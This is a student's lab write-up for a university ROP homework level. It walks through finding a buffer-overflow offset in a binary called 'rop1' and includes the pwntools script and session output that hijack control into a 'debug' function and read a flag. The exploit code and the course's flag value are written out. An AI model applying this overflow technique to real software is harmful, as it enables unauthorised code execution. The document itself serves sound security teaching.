# README
# Part 3 - ROPing
## Author

name: Brian C. Morris

email: bcmorri3@ncsu.edu

Unity id: bcmorri3

## Level 1
### Vulnerability:
Can return into debug by buffer overflow, overwriting the frame pointer.
### Description
After logging into the ROP homework folder, I ran the server binary with port number '6969' in an SSH terminal like so:

```
bcmorri3@binhw-trusty-3:~/ROP/Level1$ ls
flag.txt  libc.so  rop1  server
bcmorri3@binhw-trusty-3:~/ROP/Level1$ ./server 6969
6969
```

I then logged into a local terminal, using the Windows Linux Subsystem to host a local ssh server, connected to the server running on the SSH terminal connected to the homework server like so:

```
ssh -L 5050:localhost:6969 -p 60047 bcmorri3@wtl.csc.ncsu.edu
The authenticity of host '[wtl.csc.ncsu.edu]:60047 ([152.14.93.39]:60047)' can't be established.
ECDSA key fingerprint is SHA256:60cfVx0inST/bEJ7MztBMM8NTCjCaZC0o5Dv0+wldIM.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[wtl.csc.ncsu.edu]:60047,[152.14.93.39]:60047' (ECDSA) to the list of known hosts.
bcmorri3@wtl.csc.ncsu.edu's password:
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 3.13.0-132-generic i686)
```

This is because pwntools, the library used to use the exploit cannot SSH into multiple ports.

I used another SSH terminal to re-connect to the homework server and ran the rop1 binary with strace -f enabled. For the command I input "new", and then input 5,000 characters, and then input the "quit" command, segfaulting the program. I used the strace output to determine the memory address of the segfault at: 0x316a4130

Knowing this, I then used [this](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) website again to determine the number of characters that caused the segfault, revealing that 272 characters were overwritten before segfaulting. I then used objdump-d on rop1 to determine the address of debug was at: 080480d8. Finally, I had the necessary information to overwrite the frame pointer to return into debug!

I wrote a simple python script in the terminal to perform the ROP attack like so:

```
>>> from pwn import *
>>> payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4
Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4
Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj\xd8\x80\x04\x08"
>>> sock = remote('localhost',5050)
[x] Opening connection to localhost on port 5050
[x] Opening connection to localhost on port 5050: Trying 127.0.0.1
[+] Opening connection to localhost on port 5050: Done
>>> sock.recvuntil(">>")
'Company memo managar\nEnter a Command:\n\n>>'
>>> sock.sendline("new")
>>> sock.sendline(payload)
>>> sock.sendline("quit")
>>> sock.interactive()
[*] Switching to interactive mode
 Enter a new memo:
>> GoodBye!
cat flag.txt
flag{962298381ee833624ac3451189b25583}
```

Flag retrieved!

## Levels 2-4 were skipped for this assignment.
